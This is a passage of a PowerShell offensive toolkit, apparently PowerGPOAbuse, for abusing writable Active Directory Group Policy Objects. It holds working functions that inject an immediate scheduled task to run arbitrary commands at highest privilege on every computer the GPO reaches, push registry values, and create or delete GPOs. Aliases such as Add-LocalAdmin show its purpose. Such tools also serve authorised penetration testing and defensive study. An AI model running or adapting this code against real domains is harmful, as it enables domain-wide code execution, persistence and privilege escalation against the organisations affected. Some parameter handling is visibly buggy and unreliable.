        $RawGpoObject = Get-DomainGPO @arguments -GPOIdentity $GPOIdentity -Raw
        $GpoObject = $RawGpoObject.Properties
        $share = Mount-SmbShare @arguments -DomainShare -Path $GpoObject.gpcfilesyspath

        $GPOPath = -join @($share, ":")
        $GPOInipath = -join @($GPOPath, "\GPT.ini")
    }

    PROCESS {

        $start = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">'
        $end = '</ScheduledTasks>'
        $ImmediateXmlTask = "<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>" -f (ConvertTo-XMLString $Author), (ConvertTo-XMLString $TaskName), (ConvertTo-XMLString $Command), (ConvertTo-XMLString $CommandArguments), ([System.String]([System.Guid]::NewGuid().Guid))

            if (Test-Path -Path $GPOPath) {

                $path = -join @($GPOPath,"\$(if ($Scope -eq "Computer") {"Machine"} else {$Scope})\Preferences\ScheduledTasks\")
            } else {

                Write-Verbose "[Add-GPOImmediateTask] Could not find the specified GPO"
                return
            }
    
            if (-not (Test-Path -Path $path)) {
    
                New-Item -ItemType Directory -Path $path | Out-Null
            } 
    
            $path = -join @($path,'ScheduledTasks.xml')
            if (Test-Path -Path $path) {
    
                if ($Force) {
    
                    Write-Verbose "[Add-GPOImmediateTask] Modifying $path"
                    $content = Get-Content -Path $path
                    $new_list = @()
                    foreach ($line in $content) {
                        
                        if (($line -replace " ", "").Contains("</ScheduledTasks>")) {
    
                            $new_list.Add(-join @($ImmediateXmlTask, $line))
                        }
                        $new_list.Add($line)
                    }
                    Set-Content -Path $path -Value ($new_list | Out-String) 
                    
                    $returnValue = Update-GPO @arguments -InputObject $RawGpoObject -Path $GPOInipath -GPOType $Scope -CSE (New-CSEValues -ImmediateTask)
                } else {
    
                    Write-Verbose "[Add-GPOImmediateTask] The GPO already includes a ScheduledTasks.xml. Use -Force to append to ScheduledTasks.xml or choose another GPO"
                    return
                }
            } else {
    
                Write-Verbose "[Add-GPOImmediateTask] Creating file $path"
                $null = New-Item -Path $path -ItemType File
                $content = @"
$start
$ImmediateXmlTask
$end
"@
                Set-Content -Path $path -Value $content
                
                $returnValue = Update-GPO @arguments -InputObject $RawGpoObject -Path $GPOInipath -GPOType $Scope -CSE (New-CSEValues -ImmediateTask)
            } 
        Write-Verbose "[Add-GPOImmediateTask] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle"
    }

    END {

        Mount-SmbShare -Remove $share
        return $returnValue
    }
}

function Add-GPORegistryPreference {

<#
    
    .SYNOPSIS

        This function add a registry key using GPO.
    
    .DESCRIPTION

        Custom xml is crafted from the user's input, the GPO is mounted and files are modified.
        The GPO is finaly updated with appropriate GUIDs.
    
    .PARAMETER GPOIdentity

        The displayname/LDAP Path/disguishedname/name of the vulnerable GPO.

    .PARAMETER RegistryPath

        The path of the registry key to add.

    .PARAMETER RegistryKey

        The name of the registry key to add.

    .PARAMETER RegistryValueType

        The type of the registry key to add.

    .PARAMETER RegistryValue

        The value of the registry key to add.
    
    .PARAMETER Domain
    
        Set the target domain.
    
    .PARAMETER DomainController
    
        Set the target domain controller.
    
    .PARAMETER Credential
    
        PSCredential to use for connection.

    .EXAMPLE

        Add-GPORegistryPreference -GPOIdentity SuperSecureGPO -RegistryPath "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -RegistryKey "__PSLockdownPolicy" -RegistryValue "4" -RegistryValueType String -RegistryAction Create
#>
    
    [OutputType([System.Boolean])]
    [CmdletBinding()]
    
    param (
        
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Identity", "TargetIdentity")]
        [String]
        $GPOIdentity,
    
        [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Path")]
        [String]
        $RegistryPath,
    
        [Parameter(Mandatory=$true, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Key")]
        [String]
        $RegistryKey,
    
        [Parameter(Mandatory=$true, Position=3, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Value")]
        [String]
        $RegistryValue,
    
        [Parameter(Mandatory=$true, Position=4, ValueFromPipeline=$true)]
        [ValidateSet("String", "EnvironmentString", "MultiString", "Binary", "Int32", "Int64")]
        [Alias("Type")]
        [String]
        $RegistryValueType,
    
        [Parameter(Mandatory=$true, Position=5, ValueFromPipeline=$true)]
        [ValidateSet("Create", "Update", "Delete", "Replace")]
        [Alias("Action")]
        [String]
        $RegistryAction,
    
        [Parameter(Mandatory=$false, Position=6, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
    
        [Parameter(Mandatory=$false, Position=7, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,
    
        [Parameter(Mandatory=$false, Position=8, ValueFromPipeline=$true)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
        
    BEGIN {
    
        $actions = @{"Create" = @("C", "0"); "Update" = @("U", "2"); "Delete" = @("D", "3"); "Replace" = @("R", "1")}
        $ValueType = @{"String"= "REG_SZ"; "EnvironmentString"= "REG_EXPAND_SZ"; "MultiString"= "REG_MULTI_SZ"; "Binary"= "REG_BINARY"; "Int32"= "REG_DWORD"; "Int64" = "REG_QWORD";}
        $arguments = @{}
    
        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}
    
        $RegAction = $actions[$RegistryAction]
        $RegType = $ValueType[$RegistryValueType]
        $RegistryGuid = [System.Guid]::NewGuid().Guid
    
        $RawGpoObject = Get-DomainGPO -GPOIdentity $GPOIdentity -Raw
        $GpoObject = $RawGpoObject.Properties
    
        $share = Mount-SmbShare @arguments -DomainShare -Path $GpoObject.gpcfilesyspath
    
        $GPOPath = -join @($share, ":")
        $GPOInipath = -join @($GPOPath, "\GPT.ini")
    
        if ($RegistryPath.Substring(0, $RegistryPath.IndexOf("\")) -match "HKEY_LOCAL_MACHINE|HKLM") {
    
            $Hive = "HKEY_LOCAL_MACHINE"
        } elseif ($RegistryPath.Substring(0, $RegistryPath.IndexOf("\")) -match "HKEY_CURRENT_USER|HKCU") {
    
            $Hive = "HKEY_CURRENT_USER"
        } elseif ($RegistryPath.Substring(0, $RegistryPath.IndexOf("\")) -match "HKEY_CLASS_ROOT|HKCR") {
            
            $Hive = "HKEY_CLASS_ROOT"
        } elseif ($RegistryPath.Substring(0, $RegistryPath.IndexOf("\")) -match "HKEY_CURRENT_CONFIG|HKCC") {
            
            $Hive = "HKEY_CURRENT_CONFIG"
        } else {
    
            $Hive = "HKEY_LOCAL_MACHINE"
        }
            
        $RegistryPath = $RegistryPath.Substring($RegistryPath.IndexOf("\"))
        if ($RegistryPath[-1] -eq "\") {$RegistryPath = $RegistryPath.Substring(0, $RegistryPath.Length - 1)}
    }
        
    PROCESS {
            
        if (Test-Path $GPOPath) {
    
            $GPORegistryPath = -join @($GPOPath, "\Machine\Preferences\Registry\")
        } else {
    
            Write-Verbose "[Add-GPORegistryPreference] Could not find the specified GPO"
            return
        }
    
        if (Test-Path  $GPORegistryPath) {
    
            $content = @"
    <Registry clsid="{9CD4B2F4-923D-47f5-A062-E897DD1DAD50}" name="$RegistryKey" status="$RegistryKey" image="$($RegistryAction[1])" changed="DATE_REPLACE" uid="$RegistryGuid" disabled="0">                               
        <Properties action="$($RegAction[0])" displayDecimal="0" default="0" hive="$Hive" key="$RegistryPath" name="$RegistryKey" type="$RegValueType" value="$RegistryValue" />                                    
    </Registry>
"@
    
            $currentXml = Get-Content -Path ($GPORegistryPath + "Registry.xml")
            $final = New-Object System.Collections.ArrayList
    
            foreach ($line in $currentXml) {
                
                if ($currentXml[$currentXml.IndexOf($line) + 1] -eq "</RegistrySettings>") {
    
                    $null = $final.Add($line)
                    $null = $final.Add($content)
                } else {
    
                    $null = $final.Add($line)
                }
            }
    
            Write-Verbose "[Add-GPORegistryPreference] Updating $($GPORegistryPath + "Registry.xml")"
            Set-Content -Path ($GPORegistryPath + "Registry.xml") -Value $final.Replace("DATE_REPLACE", [System.DateTime]::Now.ToString("yyyy-MM-dd hh:mm:ss"))
        } else {
    
            $null = New-Item -ItemType Directory -Path $GPORegistryPath
            $null = New-Item -ItemType File -Path ($GPORegistryPath + "Registry.xml") -Force
            Write-Verbose "[Add-GPORegistryPreference] Creating $($GPORegistryValue + "Registry.xml")"
                
            $content = @"
<?xml version="1.0" encoding="utf-8"?>                                                                                                                                                                                                       
<RegistrySettings clsid="{A3CCFC41-DFDB-43a5-8D26-0FE8B954DA51}">                                                                                                                                                                              
    <Registry clsid="{9CD4B2F4-923D-47f5-A062-E897DD1DAD50}" name="$RegistryKey" status="$RegistryKey" image="$($RegistryAction[1])" changed="DATE_REPLACE" uid="$RegistryGuid" disabled="0">                               
        <Properties action="$($RegistryAction[0])" displayDecimal="0" default="0" hive="$Hive" key="$RegistryPath" name="$RegistryKey" type="$RegistryValueType" value="$RegistryValue" />                                    
    </Registry>                                                                                                                                                                                                                                
</RegistrySettings>
"@
    
            Set-Content -Path $($GPORegistryPath + "Registry.xml") -Value $content.Replace("DATE_REPLACE", [System.DateTime]::Now.ToString("yyyy-MM-dd hh:mm:ss"))
            Write-Verbose "[Add-GPORegistryPreference] Setting content of Registry.xml"
        }
    
        Write-Verbose "[Add-GPORegistryPreference] Updating GPO"
        $ReturnValue = Update-GPO @arguments -InputObject $RawGpoObject -GPOType Computer -Path $GPOInipath -CSE $(New-CSEValues -RegistryPref)
    }
        
    END {
        
        Mount-SmbShare -Remove $share
        return $returnValue
    }
}

function New-DomainGPO {

<#
    
    .SYNOPSIS
    
        This function create a new GPO with a DisplayName specified by the user.
    
    .DESCRIPTION
    
        It mounts the GPO LDAP container, do a Create LDAP request, set different attributes
        then create Machine and User Child, finally it returns a PSCustomObject of the GPO properties.
    
    .PARAMETER DisplayName
    
        Set GPO DisplayName (something usually humans can understand) its alias is GPOName.
    
    .PARAMETER Domain
    
        Set the target domain.
    
    .PARAMETER DomainController
    
        Set the target domain controller.
    
    .PARAMETER Credential
    
        PSCredential to use for connection.
    
    .EXAMPLE
    
        New-DomainGPO -DisplayName SuperSecureGPO
    
    .EXAMPLE
    
        $pass = ConvertTo-SecureString -AssPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential -ArgumentList "testlab\bobby",$pass
        New-DomainGPO -DisplayName SuperSecureGPO -Credential $cred
    
    .EXAMPLE
    
        New-DomainGPO -DisplayName SuperSecureGPO -Domain testlab.local
    
    .NOTES
    
        see [MS-GPOL] for GPO creation by "Create" LDAP request.
    
#>
    
    [OutputType([System.Management.Automation.PSCustomObject])]
    [OutputType('PowerGPOAbuse.GPO')]
    [CmdletBinding()]
    
    param (
            
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("GPOName", "Name")]
        [String]
        $DisplayName,
    
        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
    
        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,
    
        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$false)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
        
    BEGIN {
    
        $arguments = @{}
    
        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}
    
        $DomainObj = Get-Domain @arguments
    
        $DomainDN = "DC=$($domainObj.Name.Replace('.',	',DC='))"
        $futureGPOName = "{" + ([System.Guid]::NewGuid()).Guid + "}"
        $LDAPPath = "LDAP://CN=Policies,CN=System,$DomainDN"
    
        if ($PSBoundParameters["Credential"]) {
    
            $ADSIObject = New-Object System.DirectoryServices.DirectoryEntry -ArgumentList $LDAPPath,$Credential.GetNetworkCredential().UserName,$Credential.GetNetworkCredential().Password
        } else {
    
            $ADSIObject = New-Object System.DirectoryServices.DirectoryEntry $LDAPPath
        }
    }
        
    PROCESS {
            
        Write-Verbose "[New-DomainGPO] Creating GPO object"
        $newGpo = $ADSIObject.Create("groupPolicyContainer", "CN=$futureGPOName")
        $newGpo.Put("displayname", $DisplayName)
        $newGpo.setinfo()

    
        if ($PSBoundParameters["Credential"]) {
    
            $ADSIObject = New-Object System.DirectoryServices.DirectoryEntry -ArgumentList $newGpo.Path,$Credential.GetNetworkCredential().UserName,$Credential.GetNetworkCredential().Password
        } else {
    
            $ADSIObject = New-Object System.DirectoryServices.DirectoryEntry $newGpo.Path
        }

        Write-Verbose "[New-DomainGPO] Setting Properties"

        $ADSIObject.flags = 0
        $ADSIObject.versionnumber = 0 
        $ADSIObject.gpcfunctionalityversion = 2
        $ADSIObject.CommitChanges()
        $ADSIObject.InvokeSet("gPCFileSysPath", (-join @("\\", $DomainObj.Name, "\SYSVOL\", $DomainObj.Name, "\Policies\", $futureGPOName)))
        $ADSIObject.CommitChanges()
        
    
        Write-Verbose "[New-DomainGPO] Creating User and Machine child"
        $machine = $ADSIObject.Create("Container", "CN=Machine")
        $machine.setinfo()
    
        $user = $ADSIObject.Create("Container", "CN=User")
        $user.setinfo()

        Write-Verbose "[New-DomainGPO] Creating files"

        $share = Mount-SmbShare -DomainShare -Path (-join @("\\", $DomainObj.Name, "\SYSVOL\", $DomainObj.Name, "\Policies\"))

        $path = $share + ":\$futureGPOName"

        $null = New-Item -ItemType Directory -Path $path
        $null = New-Item -ItemType Directory -Path ($path + "\Machine")
        $null = New-Item -ItemType Directory -Path ($path + "\User")
        
        $null = New-Item -ItemType File -Path ($path + "\GPT.INI")

        $iniFile = @"
[General]
Version=0
displayName=New Group Policy Object
"@

        $null = Set-Content -Path ($path + "\GPT.INI") -Value $iniFile

        Mount-SmbShare -Remove $share
    }
        
    END {
        
        return (Get-DomainGPO @arguments -GPOIdentity $futureGPOName)
    }
}

function Remove-DomainGPO {

<#

    .SYNOPSIS

        This function is the reciprocal of New-DomainGPO. It deletes a specified GPO.

    .DESCRIPTION

        In a first time, the GPO is mounted, then the method DeleteTree()  is called, if GPO files have to be deleted,
        GPO path is mounted, then Remove-Item is called with -Recurse flag.

    .PARAMETER GPOIdentity

        The displayname/LDAP Path/disguishedname/name of the GPO that will be deleted.

    .PARAMETER RemoveFile

        Indicate if files have to be deleted.

    .PARAMETER Domain
    
        Set the target domain.
    
    .PARAMETER DomainController
    
        Set the target domain controller.
    
    .PARAMETER Credential
    
        PSCredential to use for connection.

    .EXAMPLE

        Remove-DomainGPO -GPOIdentity TargetGPO

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Remove-DomainGPO -GPOIdentity TargetGPO -Domain testlab.local -Credential $cred -Verbose
#>

    [OutputType([System.Boolean])]
    [CmdletBinding()]
    
    param (
        
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Identity", "Name")]
        [String]
        $GPOIdentity,

        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$false)]
        [Switch]
        $RemoveFile,

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$false)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
    
    BEGIN {
        
        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}

        $GpoObject = Get-DomainGPO @arguments -GPOIdentity $GPOIdentity
    }
    
    PROCESS {
        
        if ($PSBoundParameters["Credential"]) {

            $ADSIObject = New-Object System.DirectoryServices.DirectoryEntry -ArgumentList $GpoObject.adspath,$Credential.GetNetworkCredential().UserName,$Credential.GetNetworkCredential().Password
        } else {

            $ADSIObject = New-Object System.DirectoryServices.DirectoryEntry $GpoObject.adspath
        }
        
        if ($RemoveFile.IsPresent) {

            Write-Verbose "[Remove-DomainGPO] Deleting SYSVOL files"
            $share = Mount-SmbShare @arguments -DomainShare -Path ($GpoObject.gpcfilesyspath).Replace($GpoObject.name, "")

            try {

                Remove-Item -Recurse -Force -Path (-join @($share, ":\$($GpoObject.name)"))
            } catch {

                Write-Warning "[Remove-DomainGPO] Insufficient right for removing files on SYSVOL"
            }
            
            Mount-SmbShare -Remove $share
        }

        Write-Verbose "[Remove-DomainGPO] Removing ADSI object"

        try {
            
            $ADSIObject.DeleteTree()
            $returnValue = $true
        }
        catch {
            
            Write-Warning "[Remove-DomainGPO] Insufficient right for removing ADSI object"
            $returnValue = $false
        }
    }
    
    END {
        
        return $returnValue
    }
}

Set-Alias -Name "Add-LocalAdmin" -Value "Add-GPOGroupMember" 
Set-Alias -Name "Add-UserRights" -Value "AddGPOUserRights"
Set-Alias -Name "Add-Script" -Value "Add-GPOStartupScript"
Set-Alias -Name "Add-Task" -Value "Add-GPOImmediateTask"
Set-Alias -Name "Add-RegistryValue" -Value "Add-GPORegistryPreference"